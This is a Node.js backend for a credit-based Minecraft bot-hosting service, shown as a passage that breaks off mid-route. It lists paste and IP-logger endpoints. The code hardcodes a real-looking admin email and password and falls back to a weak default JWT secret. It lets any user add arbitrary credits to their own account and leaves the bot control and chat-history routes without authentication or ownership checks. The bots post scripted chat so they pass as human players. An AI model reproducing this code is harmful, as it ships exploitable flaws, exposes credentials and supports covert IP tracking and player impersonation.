// MineX AIO Hub - Backend Server
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const mineflayer = require('mineflayer');
const jwt = require('jsonwebtoken');
const bcrypt = require('bcryptjs');
const { DatabaseManager, User, Paste, IpLog, Account, GeneratedLink, Bot, PromoCode } = require('./database');

// Helper: Equip Best Tool
const equipBestTool = async (bot, category) => {
    if (!bot || !bot.inventory) return false;
    const items = bot.inventory.items();
    let bestItem = null;

    if (category === 'weapon') {
        const weapons = items.filter(i => i.name.includes('sword') || i.name.includes('axe'));
        // Sort by damage (rough approximation: netherite > diamond > iron > stone > wood > gold)
        const materials = ['netherite', 'diamond', 'iron', 'stone', 'wood', 'gold'];
        weapons.sort((a, b) => {
            const aMat = materials.findIndex(m => a.name.includes(m));
            const bMat = materials.findIndex(m => b.name.includes(m));
            return (aMat === -1 ? 99 : aMat) - (bMat === -1 ? 99 : bMat);
        });
        bestItem = weapons[0];
    } else if (category === 'mining') {
        const picks = items.filter(i => i.name.includes('pickaxe'));
        const materials = ['netherite', 'diamond', 'iron', 'stone', 'wood', 'gold'];
        picks.sort((a, b) => {
            const aMat = materials.findIndex(m => a.name.includes(m));
            const bMat = materials.findIndex(m => b.name.includes(m));
            return (aMat === -1 ? 99 : aMat) - (bMat === -1 ? 99 : bMat);
        });
        bestItem = picks[0];
    }

    if (bestItem) {
        try {
            await bot.equip(bestItem, 'hand');
            return true;
        } catch (e) { return false; }
    }
    return false;
};

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

app.use(cors());
app.get('/', (req, res) => {
    res.send(`
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MineX AIO Backend</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: linear-gradient(135deg, #0a0f0a 0%, #1a2a1a 100%);
            font-family: 'Courier New', monospace;
            color: #00ff00;
        }
        .container {
            text-align: center;
            padding: 40px;
            border: 2px solid #00ff00;
            background: rgba(0, 255, 0, 0.05);
            box-shadow: 0 0 30px rgba(0, 255, 0, 0.2);
        }
        h1 { font-size: 2.5rem; margin-bottom: 20px; text-shadow: 0 0 10px #00ff00; }
        .status { font-size: 1.2rem; margin: 10px 0; }
        .dot { display: inline-block; width: 12px; height: 12px; background: #00ff00; border-radius: 50%; margin-right: 8px; animation: pulse 1s infinite; }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .endpoints { margin-top: 30px; text-align: left; font-size: 0.9rem; color: #88ff88; }
        .endpoints li { margin: 5px 0; }
    </style>
</head>
<body>
    <div class="container">
        <h1>⚡ MineX AIO Backend</h1>
        <p class="status"><span class="dot"></span> Server is ONLINE</p>
        <p class="status">Database: ${dbManager.status.toUpperCase()}</p>
        <p class="status">Active Bots: ${activeBots.size}</p>
        <div class="endpoints">
            <p><strong>Available Endpoints:</strong></p>
            <ul>
                <li>POST /api/auth/register</li>
                <li>POST /api/auth/login</li>
                <li>POST /api/paste/create</li>
                <li>GET /api/paste/:code</li>
                <li>POST /api/iplogger/create</li>
                <li>GET /api/admin/stats</li>
            </ul>
        </div>
    </div>
</body>
</html>
    `);
});

const JWT_SECRET = process.env.JWT_SECRET || 'minex-secret-key-change-this';

app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// In-Memory Runtime Data
const activeBots = new Map(); // Runtime only, not persisted

// Initialize Database Manager
const dbManager = new DatabaseManager();

// --- HELPER FUNCTIONS (Unified Data Access) ---

async function findUser(username) {
    if (dbManager.status !== 'mongodb') return null;
    const user = await User.findOne({ username });
    return user ? user.toObject() : null;
}

async function createUser(userData) {
    if (dbManager.status !== 'mongodb') throw new Error('Database not connected');
    const user = new User(userData);
    await user.save();
    return user.toObject();
}

// Middleware
const requireAuth = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token || token === 'null' || token === 'undefined') {
        return res.status(401).json({ success: false, error: 'Authorization token required' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ success: false, error: 'Invalid or expired token' });
        req.user = user;
        next();
    });
};

app.get('/api/auth/me', requireAuth, async (req, res) => {
    try {
        const user = await findUser(req.user.username);
        if (!user) return res.status(404).json({ success: false, error: 'User not found' });
        const { password, ...userWithoutPassword } = user;
        res.json({ success: true, user: userWithoutPassword });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token || token === 'null' || token === 'undefined') {
        return next();
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (!err) req.user = user;
        next();
    });
};

// ============= ADMIN ROUTES =============

app.post('/api/admin/login', (req, res) => {
    const { email, password } = req.body;
    // Hardcoded Admin Credentials
    if (email === 'operators130@gmail.com' && password === '0po98iu76yt5@SS') {
        const token = jwt.sign({ role: 'admin' }, JWT_SECRET, { expiresIn: '1h' });
        res.json({ success: true, token });
    } else {
        res.status(401).json({ success: false, error: 'Invalid admin credentials' });
    }
});

const requireAdmin = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];
    if (token == null) return res.sendStatus(401);
    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err || decoded.role !== 'admin') return res.sendStatus(403);
        next();
    });
};

app.get('/api/stats', async (req, res) => {
    try {
        const users = await User.countDocuments();
        const activeBotsCount = activeBots.size;
        res.json({
            success: true,
            stats: {
                users,
                onlineBots: activeBotsCount,
                dbStatus: dbManager.status
            }
        });
    } catch (e) {
        res.status(500).json({ success: false });
    }
});

app.get('/api/admin/stats', requireAdmin, async (req, res) => {
    let stats = {
        users: 0,
        pastes: 0,
        links: 0,
        bots: activeBots.size,
        dbStatus: dbManager.status
    };

    if (dbManager.status !== 'mongodb') {
        return res.json({ success: false, error: 'Database not connected' });
    }

    try {
        stats.users = await User.countDocuments();
        stats.pastes = await Paste.countDocuments();
        stats.links = await IpLog.countDocuments();
    } catch (e) {
        console.error(e);
        return res.status(500).json({ success: false, error: 'Stats failed' });
    }
    res.json({ success: true, stats });
});

app.get('/api/admin/databases', requireAdmin, (req, res) => {
    res.json({ success: true, databases: dbManager.getDatabases() });
});

app.post('/api/admin/database/add', requireAdmin, (req, res) => {
    const { alias, connectionString } = req.body;
    if (!alias || !connectionString) return res.json({ success: false, error: 'Alias and URL required' });
    const result = dbManager.addDatabase(alias, connectionString);
    res.json(result);
});

app.post('/api/admin/database/switch', requireAdmin, async (req, res) => {
    const { alias } = req.body;
    const result = await dbManager.switchDatabase(alias);
    res.json(result);
});

app.post('/api/admin/database/disconnect', requireAdmin, async (req, res) => {
    const result = await dbManager.disconnect();
    res.json(result);
});

app.post('/api/admin/database/migrate', requireAdmin, async (req, res) => {
    const { options, targetAlias } = req.body; // { users: boolean, tools: boolean }, targetAlias: string

    if (targetAlias) {
        const switchResult = await dbManager.switchDatabase(targetAlias);
        if (!switchResult.success) return res.json(switchResult);
    }

    const result = await dbManager.migrateToMongo(options || { users: true, tools: true });
    res.json(result);
});

// Delete a database config (not the actual DB, just removes from list)
app.post('/api/admin/database/delete', requireAdmin, (req, res) => {
    const { alias } = req.body;
    if (!alias) return res.json({ success: false, error: 'Alias required' });
    const result = dbManager.deleteDatabase(alias);
    res.json(result);
});

// Migrate data from one MongoDB to another
app.post('/api/admin/database/migrate-db', requireAdmin, async (req, res) => {
    const { sourceAlias, targetAlias, options } = req.body;
    if (!sourceAlias || !targetAlias) {
        return res.json({ success: false, error: 'Source and target aliases required' });
    }
    const result = await dbManager.migrateDbToDb(sourceAlias, targetAlias, options || { users: true, tools: true });
    res.json(result);
});

// Admin User Search
app.get('/api/admin/users/search', requireAdmin, async (req, res) => {
    const { q } = req.query;
    if (!q) return res.json({ success: true, users: [] });

    try {
        let users = [];
        if (dbManager.status !== 'mongodb') {
            return res.json({ success: false, error: 'Database not connected' });
        }
        users = await User.find({ username: { $regex: q, $options: 'i' } })
            .select('id username credits')
            .limit(20);
        res.json({ success: true, users });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Search failed' });
    }
});

// Admin Add Credits
app.post('/api/admin/users/add-credits', requireAdmin, async (req, res) => {
    const { username, amount } = req.body;
    if (!username || !amount) return res.json({ success: false, error: 'Username and amount required' });

    try {
        let newCredits = 0;
        if (dbManager.status !== 'mongodb') {
            return res.json({ success: false, error: 'Database not connected' });
        }

        const user = await User.findOneAndUpdate(
            { username },
            { $inc: { credits: parseInt(amount) } },
            { new: true }
        );
        if (!user) return res.json({ success: false, error: 'User not found' });
        newCredits = user.credits;
        res.json({ success: true, credits: newCredits, message: `Added ${amount} credits to ${username}` });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Failed to add credits' });
    }
});

// Admin: Kill All Bots
app.post('/api/admin/bots/kill-all', requireAdmin, async (req, res) => {
    try {
        let killed = 0;
        for (const [sessionId, bot] of activeBots) {
            try {
                bot._manuallyStopped = true;
                bot.quit();
                killed++;
            } catch (e) { }
        }
        activeBots.clear();
        await Bot.updateMany({ status: 'online' }, { $set: { status: 'offline' } });
        res.json({ success: true, message: `Killed ${killed} bot(s)`, killed });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ============= AUTH ROUTES =============

app.post('/api/auth/register', async (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ success: false, error: 'Missing fields' });

    const existing = await findUser(username);
    if (existing) return res.status(400).json({ success: false, error: 'Username taken' });

    const hashedPassword = await bcrypt.hash(password, 10);
    const user = {
        id: Date.now().toString(),
        username,
        password: hashedPassword,
        createdAt: Date.now()
    };
    await createUser(user);

    const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '7d' });
    res.json({ success: true, token, user: { id: user.id, username: user.username } });
});

app.post('/api/auth/login', async (req, res) => {
    const { username, password } = req.body;
    const user = await findUser(username);
    if (!user) return res.status(401).json({ success: false, error: 'Invalid credentials' });

    if (await bcrypt.compare(password, user.password)) {
        const token = jwt.sign({ id: user.id, username: user.username }, JWT_SECRET, { expiresIn: '7d' });
        res.json({ success: true, token, user: { id: user.id, username: user.username } });
    } else {
        res.status(401).json({ success: false, error: 'Invalid credentials' });
    }
});


app.get('/api/user/history', requireAuth, async (req, res) => {
    const userId = req.user.id;
    let userPastes = [];
    let userLinks = [];

    if (dbManager.status === 'mongodb') {
        userPastes = await Paste.find({ userId });
        userLinks = await IpLog.find({ userId });
    } else {
        return res.json({ success: false, error: 'Database not connected' });
    }
    res.json({ success: true, pastes: userPastes, links: userLinks });
});

// ============= CREDITS SYSTEM =============

// In-memory credits storage (Removed - using MongoDB)

// Get user credits
app.get('/api/user/credits', requireAuth, async (req, res) => {
    try {
        const user = await findUser(req.user.username);
        res.json({ success: true, credits: user ? (user.credits || 0) : 0 });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Server error' });
    }
});

// Add credits (after watching ad/AFK)
app.post('/api/user/credits/add', requireAuth, async (req, res) => {
    const { amount, source } = req.body;
    if (!amount || amount < 0) return res.json({ success: false, error: 'Invalid amount' });

    try {
        let credits = 0;
        if (dbManager.status !== 'mongodb') {
            return res.json({ success: false, error: 'Database not connected' });
        }

        const user = await User.findOneAndUpdate(
            { username: req.user.username },
            { $inc: { credits: amount } },
            { new: true }
        );
        if (!user) return res.json({ success: false, error: 'User not found' });
        credits = user.credits;
        res.json({ success: true, credits, added: amount, source });
    } catch (e) {
        res.status(500).json({ success: false, error: 'Failed to update credits' });
    }
});

// Daily bonus claim
app.post('/api/user/credits/daily', requireAuth, async (req, res) => {
    const today = new Date().toDateString();

    try {
        if (dbManager.status !== 'mongodb') {
            return res.json({ success: false, error: 'Database not connected' });
        }

        const user = await findUser(req.user.username);

        if (user && user.lastDailyClaim === today) {
            return res.json({ success: false, error: 'Daily bonus already claimed today' });
        }

        const DAILY_BONUS = 10;
        const updatedUser = await User.findOneAndUpdate(
            { username: req.user.username },
            {
                $inc: { credits: DAILY_BONUS },
                $set: { lastDailyClaim: today }
            },
            { new: true }
        );
        return res.json({ success: true, credits: updatedUser.credits, added: DAILY_BONUS });

    } catch (e) {
        console.error(e);
        res.status(500).json({ success: false, error: 'Failed to claim bonus' });
    }
});

// ============= ADMIN ROUTES (Moderation) =============

// Reset User Password
app.post('/api/admin/user/:id/reset-password', requireAdmin, async (req, res) => {
    try {
        const { newPassword } = req.body;
        if (!newPassword) return res.json({ success: false, error: 'New password required' });

        const hashedPassword = await bcrypt.hash(newPassword, 10);
        await User.findByIdAndUpdate(req.params.id, { password: hashedPassword });

        res.json({ success: true, message: 'Password reset successfully' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Delete User
app.delete('/api/admin/user/:id/delete', requireAdmin, async (req, res) => {
    try {
        await User.findByIdAndDelete(req.params.id);
        res.json({ success: true, message: 'User deleted successfully' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Get generation history
app.get('/api/user/generation-history', requireAuth, async (req, res) => {
    // This would need a proper history collection in MongoDB
    // For now, return empty array as placeholder
    res.json({ success: true, history: [] });
});

// ============= PROMO CODE ROUTES =============

// Admin: Create promo code
app.post('/api/admin/promo/create', requireAdmin, async (req, res) => {
    const { code, credits, maxUses } = req.body;
    if (!code || !credits || !maxUses) {
        return res.json({ success: false, error: 'Code, credits, and max uses are required' });
    }
    try {
        const existing = await PromoCode.findOne({ code: code.toUpperCase() });
        if (existing) return res.json({ success: false, error: 'Promo code already exists' });

        const promo = new PromoCode({
            code: code.toUpperCase(),
            credits: parseInt(credits),
            maxUses: parseInt(maxUses),
            createdAt: Date.now()
        });
        await promo.save();
        res.json({ success: true, message: `Promo code ${promo.code} created`, promo });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Admin: List all promo codes
app.get('/api/admin/promo/list', requireAdmin, async (req, res) => {
    try {
        const promos = await PromoCode.find({}).sort({ createdAt: -1 });
        res.json({ success: true, promos });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Admin: Delete promo code
app.delete('/api/admin/promo/:code/delete', requireAdmin, async (req, res) => {
    try {
        const result = await PromoCode.findOneAndDelete({ code: req.params.code.toUpperCase() });
        if (!result) return res.json({ success: false, error: 'Promo code not found' });
        res.json({ success: true, message: 'Promo code deleted' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// User: Redeem promo code
app.post('/api/user/promo/redeem', requireAuth, async (req, res) => {
    const { code } = req.body;
    if (!code) return res.json({ success: false, error: 'Promo code is required' });

    try {
        const promo = await PromoCode.findOne({ code: code.toUpperCase(), isActive: true });
        if (!promo) return res.json({ success: false, error: 'Invalid or expired promo code' });

        if (promo.usedCount >= promo.maxUses) {
            return res.json({ success: false, error: 'This promo code has reached its usage limit' });
        }

        if (promo.usedBy.includes(req.user.username)) {
            return res.json({ success: false, error: 'You have already redeemed this code' });
        }

        // Award credits to user
        const user = await User.findOneAndUpdate(
            { username: req.user.username },
            { $inc: { credits: promo.credits } },
            { new: true }
        );
        if (!user) return res.json({ success: false, error: 'User not found' });

        // Update promo code usage
        promo.usedCount += 1;
        promo.usedBy.push(req.user.username);
        if (promo.usedCount >= promo.maxUses) promo.isActive = false;
        await promo.save();

        res.json({ success: true, message: `Redeemed! You received ${promo.credits} credits.`, credits: user.credits });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// ============= MC BOT ROUTES (Persistent) =============

// Per-session chat history ring buffer (last 50 messages)
const chatHistories = new Map();
const MAX_CHAT_HISTORY = 50;

function pushChatHistory(sessionId, entry) {
    if (!chatHistories.has(sessionId)) chatHistories.set(sessionId, []);
    const history = chatHistories.get(sessionId);
    history.push(entry);
    if (history.length > MAX_CHAT_HISTORY) history.shift();
}

// Helper: Spawn Bot Process
function spawnBotProcess(botData) {
    const { sessionId, host, port, username, version } = botData;

    // Prevent duplicates
    if (activeBots.has(sessionId)) return;

    try {
        const bot = mineflayer.createBot({
            host: host,
            port: port || 25565,
            username: username,
            version: version || false,
            auth: 'offline',
            viewDistance: 'tiny',
            hideErrors: false,
            checkTimeoutInterval: 300000,
            skipValidation: true
        });

        bot.on('spawn', () => {
            bot._spawnedAt = Date.now();
            io.to(sessionId).emit('bot:spawned', { position: bot.entity.position, health: bot.health, food: bot.food, spawnedAt: bot._spawnedAt });
        });

        bot.on('chat', (username, message) => {
            const entry = { type: 'chat', username, message, timestamp: Date.now() };
            pushChatHistory(sessionId, entry);
            io.to(sessionId).emit('bot:chat', entry);
        });
        bot.on('message', (message) => {
            const entry = { type: 'system', message: message.toString(), timestamp: Date.now() };
            pushChatHistory(sessionId, entry);
            io.to(sessionId).emit('bot:message', entry);
        });

        // Auto-respawn on death
        bot.on('death', () => {
            io.to(sessionId).emit('bot:message', { message: 'Bot died!', timestamp: Date.now() });
            if (botData.config?.autoRespawn !== false) { // Default to true
                setTimeout(() => {
                    try {
                        bot.chat('/respawn'); // Works on some servers
                    } catch (e) { }
                    try {
                        bot._client.write('client_command', { action: 0 }); // Respawn packet
                    } catch (e) { }
                }, 1000);
            }
        });

        bot.on('error', (err) => {
            const errorMsg = typeof err === 'string' ? err : err.message || JSON.stringify(err);
            io.to(sessionId).emit('bot:error', { error: errorMsg });
            console.error(`Bot Error [${sessionId}]:`, errorMsg);
        });

        bot.on('kicked', async (reason) => {
            io.to(sessionId).emit('bot:kicked', { reason });
            // Cleanup intervals
            if (bot._chatTimeout) clearTimeout(bot._chatTimeout);
            if (bot._moveInterval) clearInterval(bot._moveInterval);
            activeBots.delete(sessionId);
            if (botData.config?.autoReconnect && !bot._manuallyStopped) {
                console.log(`[${sessionId}] Auto-reconnecting in 3s (kicked)...`);
                setTimeout(async () => {
                    if (activeBots.has(sessionId)) return;
                    spawnBotProcess(botData);
                    // Update DB status back to online
                    try { await Bot.updateOne({ sessionId }, { status: 'online' }); } catch(e) {}
                }, 3000);
            }
        });

        bot.on('end', async (reason) => {
            io.to(sessionId).emit('bot:disconnected');
            // Cleanup intervals
            if (bot._chatTimeout) clearTimeout(bot._chatTimeout);
            if (bot._moveInterval) clearInterval(bot._moveInterval);
            activeBots.delete(sessionId);
            if (botData.config?.autoReconnect && !bot._manuallyStopped) {
                console.log(`[${sessionId}] Auto-reconnecting in 3s (end)...`);
                setTimeout(async () => {
                    if (activeBots.has(sessionId)) return;
                    spawnBotProcess(botData);
                    // Update DB status back to online
                    try { await Bot.updateOne({ sessionId }, { status: 'online' }); } catch(e) {}
                }, 3000);
            }
        });

        // Auto Chat & Movement Intervals
        if (botData.config?.autoChat) {
            console.log(`[${sessionId}] AutoChat enabled`);
            const messages = [
                // Casual / chill vibes
                "just vibing", "this is so peaceful", "love exploring alone", "nice day to mine",
                "i could play this all day", "this server is pretty chill", "just me and the blocks",
                "solo grinding rn", "peaceful mode activated lol", "nothing like some solo mining",
                // Reactions to surroundings
                "woah nice build", "who built that", "this area looks cool", "found a nice cave",
                "so many diamonds down here", "the view from up here is insane", "found a village lol",
                "this biome is beautiful", "i love dark oak forests", "mesa biome is underrated",
                // Mining / building talk
                "need more iron", "almost got full diamond", "building a small base",
                "making a farm brb", "enchanting table time", "need to find some lapis",
                "strip mining is the way", "branch mining > strip mining", "gotta get that fortune 3",
                "need more wood", "smelting some stuff", "organizing my chest",
                // Casual chat
                "gg", "lol", "nice", "brb eating", "back", "ok",
                "haha", "anyone know where the end portal is", "nether is scary ngl",
                "just died to a creeper smh", "hate phantoms so much",
                "enderman stole my block again", "skeletons are so annoying",
                // Loner personality
                "i prefer solo honestly", "playing alone hits different",
                "dont mind me just exploring", "im just passing through",
                "dont need a team for this", "solo survival is the real challenge",
                "i like building alone tbh", "just here to relax",
                // Random thoughts
                "what should i build next", "thinking about making a treehouse",
                "underwater base would be sick", "i wonder how deep this cave goes",
                "gonna try to find a stronghold", "need to beat the dragon sometime",
                "maybe ill build a bridge here", "i should make a nether highway",
                "anyone got spare food lol", "running low on torches"
            ];
            let lastMsg = "";
            const sendChat = () => {
                if (!activeBots.has(sessionId)) return;
                let msg;
                do { msg = messages[Math.floor(Math.random() * messages.length)]; } while (msg === lastMsg);
                lastMsg = msg;
                bot.chat(msg);
                // Random delay between 30-90 seconds for natural feel
                const nextDelay = 30000 + Math.floor(Math.random() * 60000);
                bot._chatTimeout = setTimeout(sendChat, nextDelay);
            };
            bot._chatTimeout = setTimeout(sendChat, 15000 + Math.floor(Math.random() * 20000));
        }

        if (botData.config?.randomMovement) {
            console.log(`[${sessionId}] RandomMovement enabled`);
            bot._moveInterval = setInterval(() => {
                if (!activeBots.has(sessionId)) return clearInterval(bot._moveInterval);

                const actions = ['forward', 'back', 'left', 'right', 'jump_forward', 'sprint_forward'];
                const action = actions[Math.floor(Math.random() * actions.length)];

                if (action === 'jump_forward') {
                    bot.setControlState('forward', true);
                    bot.setControlState('jump', true);
                    setTimeout(() => {
                        bot.setControlState('forward', false);
                        bot.setControlState('jump', false);
                    }, 1000);
                } else if (action === 'sprint_forward') {
                    bot.setControlState('forward', true);
                    bot.setControlState('sprint', true);
                    setTimeout(() => {
                        bot.setControlState('forward', false);
                        bot.setControlState('sprint', false);
                    }, 1500);
                } else {
                    bot.setControlState(action, true);
                    setTimeout(() => bot.setControlState(action, false), 1000 + Math.random() * 1000);
                }
            }, 4000); // reduced to 4s
        }

        activeBots.set(sessionId, bot);
    } catch (e) {
        console.error('Spawn Error:', e);
    }
}

// Create/Launch Bot
app.post('/api/bot/create', requireAuth, async (req, res) => {
    const { host, port, username, version, config } = req.body;
    const userId = req.user.id;
    const MAX_GLOBAL_BOTS = 10;
    const COST_LAUNCH = 20;

    if (dbManager.status !== 'mongodb') return res.status(503).json({ error: 'Database required' });

    try {
        // 1. Check Global Limit
        const globalCount = await Bot.countDocuments({ status: 'online' });
        if (globalCount >= MAX_GLOBAL_BOTS) {
            return res.json({ success: false, error: 'Server capacity full (Max 10 bots). Please try again later.' });
        }

        // 2. Check User Limit (1 active bot)
        const existingBot = await Bot.findOne({ userId });
        if (existingBot) {
            return res.json({ success: false, error: 'You already own a bot. Please manage it in the dashboard.', botId: existingBot._id });
        }

        // 3. Deduct Credits
        const user = await User.findOne({ username: req.user.username });
        if ((user.credits || 0) < COST_LAUNCH) {
            return res.json({ success: false, error: `Insufficient credits. Launch costs ${COST_LAUNCH}.` });
        }
        user.credits -= COST_LAUNCH;
        await user.save();

        // 4. Create Bot Entry
        const sessionId = Math.random().toString(36).substring(7);
        const expiresAt = new Date();
        expiresAt.setDate(expiresAt.getDate() + 7); // 7 Days validity

        const newBot = new Bot({
            userId,
            username: username || 'MineXBot',
            host,
            port: port || 25565,
            version: version || false,
            sessionId,
            status: 'online',
            config: config || {},
            expiresAt
        });
        await newBot.save();

        // 5. Spawn Process (Runtime)
        spawnBotProcess(newBot);

        res.json({ success: true, message: 'Bot launched successfully', sessionId, expiresAt, credits: user.credits });

    } catch (e) {
        console.error('Bot Launch Error:', e);
        res.status(500).json({ success: false, error: e.message });
    }
});

// Stop Bot
app.post('/api/bot/stop', requireAuth, async (req, res) => {
    const userId = req.user.id;
    try {
        const botRecord = await Bot.findOne({ userId });
        if (!botRecord) return res.json({ success: false, error: 'No bot found' });

        const runtimeBot = activeBots.get(botRecord.sessionId);
        if (runtimeBot) {
            runtimeBot._manuallyStopped = true;
            runtimeBot.quit();
            activeBots.delete(botRecord.sessionId);
        }

        botRecord.status = 'offline';
        await botRecord.save();
        res.json({ success: true, message: 'Bot stopped' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Start Existing Bot
app.post('/api/bot/start', requireAuth, async (req, res) => {
    const userId = req.user.id;
    const MAX_GLOBAL_BOTS = 10;

    try {
        const botRecord = await Bot.findOne({ userId });
        if (!botRecord) return res.json({ success: false, error: 'No bot found' });

        if (new Date() > botRecord.expiresAt) {
            return res.json({ success: false, error: 'Bot expired. Please renew.' });
        }

        const globalCount = await Bot.countDocuments({ status: 'online' });
        if (globalCount >= MAX_GLOBAL_BOTS) {
            return res.json({ success: false, error: 'Server capacity full.' });
        }

        if (!activeBots.has(botRecord.sessionId)) {
            spawnBotProcess(botRecord);
        }

        botRecord.status = 'online';
        await botRecord.save();

        res.json({ success: true, message: 'Bot started' });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Renew Bot
app.post('/api/bot/renew', requireAuth, async (req, res) => {
    const userId = req.user.id;
    const COST_RENEW = 30;

    try {
        const botRecord = await Bot.findOne({ userId });
        if (!botRecord) return res.json({ success: false, error: 'No bot found' });

        const user = await User.findOne({ username: req.user.username });
        if ((user.credits || 0) < COST_RENEW) {
            return res.json({ success: false, error: `Insufficient credits. Renew costs ${COST_RENEW}.` });
        }

        user.credits -= COST_RENEW;
        await user.save();

        const currentExpiry = new Date(botRecord.expiresAt);
        const now = new Date();
        const baseDate = currentExpiry > now ? currentExpiry : now;
        baseDate.setDate(baseDate.getDate() + 7);

        botRecord.expiresAt = baseDate;
        await botRecord.save();

        res.json({ success: true, message: 'Bot renewed', expiresAt: botRecord.expiresAt, credits: user.credits });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Get My Bot Status
app.get('/api/bot/my-bot', requireAuth, async (req, res) => {
    try {
        const botRecord = await Bot.findOne({ userId: req.user.id });
        if (!botRecord) return res.json({ success: true, hasBot: false });

        const runtimeBot = activeBots.get(botRecord.sessionId);
        const isOnline = !!runtimeBot;

        if (!isOnline && botRecord.status === 'online') {
            botRecord.status = 'offline';
            await botRecord.save();
        }

        // Include spawnedAt and active modes from runtime bot
        const botObj = botRecord.toObject ? botRecord.toObject() : { ...botRecord };
        if (runtimeBot) {
            if (runtimeBot._spawnedAt) botObj.spawnedAt = runtimeBot._spawnedAt;
            if (runtimeBot._premiumModes) botObj.activeModes = runtimeBot._premiumModes;
        }

        res.json({ success: true, hasBot: true, bot: botObj });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Get Chat History for a session
app.get('/api/bot/chat-history/:sessionId', requireAuth, (req, res) => {
    const history = chatHistories.get(req.params.sessionId) || [];
    res.json({ success: true, messages: history });
});

// Update Bot Config (host, port, settings)
app.post('/api/bot/config/update', requireAuth, async (req, res) => {
    const userId = req.user.id;
    const { host, port, config } = req.body;

    try {
        const botRecord = await Bot.findOne({ userId });
        if (!botRecord) return res.json({ success: false, error: 'No bot found' });

        // Update host/port if provided
        if (host) botRecord.host = host;
        if (port) botRecord.port = parseInt(port) || 25565;

        // Update config sub-object if provided
        if (config && typeof config === 'object') {
            botRecord.config = { ...botRecord.config, ...config };
        }

        await botRecord.save();
        res.json({ success: true, message: 'Bot config updated', bot: botRecord });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Legacy Chat/Action Support (checking activeBots)
app.post('/api/bot/chat', (req, res) => {
    const { sessionId, message } = req.body;
    const bot = activeBots.get(sessionId);
    if (!bot) return res.json({ success: false, error: 'Bot is offline' });
    bot.chat(message);
    res.json({ success: true });
});

app.post('/api/bot/action', (req, res) => {
    const { sessionId, action } = req.body;
    const bot = activeBots.get(sessionId);
    if (!bot) return res.json({ success: false, error: 'Bot is offline' });
    try {
        switch (action) {
            case 'jump': bot.setControlState('jump', true); setTimeout(() => bot.setControlState('jump', false), 500); break;
            case 'forward': bot.setControlState('forward', true); setTimeout(() => bot.setControlState('forward', false), 2000); break;
            case 'back': bot.setControlState('back', true); setTimeout(() => bot.setControlState('back', false), 2000); break;
            case 'left': bot.setControlState('left', true); setTimeout(() => bot.setControlState('left', false), 1000); break;
            case 'right': bot.setControlState('right', true); setTimeout(() => bot.setControlState('right', false), 1000); break;
            case 'sneak': bot.setControlState('sneak', !bot.controlState.sneak); break;
            case 'stop': bot.clearControlStates(); break;
        }
        res.json({ success: true, action });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

app.get('/api/bot/status/:sessionId', (req, res) => {
    const bot = activeBots.get(req.params.sessionId);
    if (bot && bot.entity) {
        res.json({ online: true, health: bot.health, food: bot.food, position: bot.entity.position, players: Object.keys(bot.players).length });
    } else res.json({ online: false });
});

// ============= PREMIUM BOT MODES =============

const PREMIUM_MODES = ['attack', 'mining', 'butcher', 'follow', 'skin', 'drop_all'];
const TIER_1_MODES = ['attack', 'mining', 'butcher']; // Basic connection to survival modes
const TIER_2_MODES = ['follow', 'skin', 'drop_all']; // Advanced social/control modes

const MODE_COSTS = {
    'attack': 150,
    'mining': 150,
    'butcher': 150,
    'follow': 300,
    'skin': 100,
    'drop_all': 50
};

// Get user's unlocked modes
app.get('/api/bot/modes', requireAuth, async (req, res) => {
    try {
        const user = await User.findOne({ username: req.user.username });
        const isPremium = user.premiumUntil && user.premiumUntil > Date.now();
        const tier = isPremium ? (user.premiumTier || 1) : 0;

        let unlocked = [...(user?.unlockedModes || [])];
        if (isPremium) {
            if (tier >= 1) unlocked = [...new Set([...unlocked, ...TIER_1_MODES])];
            if (tier >= 2) unlocked = [...new Set([...unlocked, ...TIER_1_MODES, ...TIER_2_MODES])];
        }

        res.json({ success: true, unlockedModes: unlocked, isPremium, premiumTier: tier, premiumUntil: user.premiumUntil });
    } catch (e) {
        res.status(500).json({ success: false, error: e.message });
    }
});

// Unlock a premium mode
app.post('/api/bot/modes/unlock', requireAuth, async (req, res) => {
    const { mode } = req.body;
    if (!PREMIUM_MODES.includes(mode)) {
        return res.json({ success: false, error: 'Invalid mode' });
    }

    try {
